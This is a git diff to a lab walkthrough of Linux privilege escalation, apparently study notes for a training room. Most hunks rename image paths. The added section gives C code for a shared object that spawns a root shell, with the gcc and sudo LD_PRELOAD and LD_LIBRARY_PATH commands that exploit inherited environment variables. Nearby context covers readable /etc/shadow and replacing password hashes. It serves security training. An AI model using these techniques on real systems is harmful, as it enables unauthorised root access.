@@ -67,7 +67,7 @@ Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/r
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Weak File Permissions - Readable /etc/shadow
 
@@ -121,7 +121,7 @@ Generate a new password hash with a password of your choice.
 mkpasswd -m sha-512 newpasswordhere
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>
 
 Comment out the old one and add our output as the hash.
 
@@ -267,7 +267,7 @@ sudo less /etc/profile
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 This option did not work on this box as when you click v it opens nano instead of vi or vim. If you can someone set the environment variables VISUAL and/or EDITOR, you could get this to work but it would be difficult.
 
@@ -338,14 +338,93 @@ iftop
 
 ## Sudo - Environment Variables
 
+### preload.c - code
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+### library\_path.c
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
+Sudo can be configured to inherit certain environment variables from the user's environment. Check which environment variables are inherited (look for the env\_keep options):
+
 **Victim**
 
 ```
-z
+sudo -l
 ```
+
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+
+**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.
+
+Create a shared object using the code located at /home/user/tools/sudo/preload.c.
 
 **Victim**
 
 ```
-z
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
 ```
+
+**LD\_PRELOAD** and **LD\_LIBRARY\_PATH** are both inherited from the user's environment. LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.
+
+Create a shared object using the code located at /home/user/tools/sudo/preload.c
+
+**Victim**
+
+```
+sudo LD_PRELOAD=/tmp/preload.so /usr/bin/ftp
+```
+
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.
+
+Run ldd against the apache2 program file to see which shared libraries are used by the program.
+
+**Victim**
+
+```
+ldd /usr/sbin/apache2
+```
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
+
+**Victim**
+
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c.
+
+**Victim**
+
+<pre><code><strong>sudo LD_LIBRARY_PATH=/tmp apache2
+</strong></code></pre>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
